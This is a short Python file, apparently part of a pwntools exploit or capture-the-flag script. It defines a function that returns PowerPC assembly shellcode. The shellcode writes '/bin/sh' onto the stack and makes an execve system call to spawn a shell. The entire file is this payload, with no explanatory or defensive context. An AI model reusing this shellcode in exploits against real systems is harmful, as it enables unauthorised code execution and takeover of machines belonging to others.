from pwn import *
def sh():
	shellcode_execve='''
	/* execve(path='/bin/sh', argv=['sh'], envp=0) */
	mr    r31,r1
	xor   r9, r9, r9
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 0x2f62
	sth   r9, 48(r31)
	li    r9, 0x696e
	sth   r9, 50(r31)
	li    r9, 0x2f73
	sth   r9, 52(r31)
	li    r9, 0x6800
	sth   r9, 54(r31)
	addi  r3, r31,0x30
	stwu  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	'''
	return shellcode_execve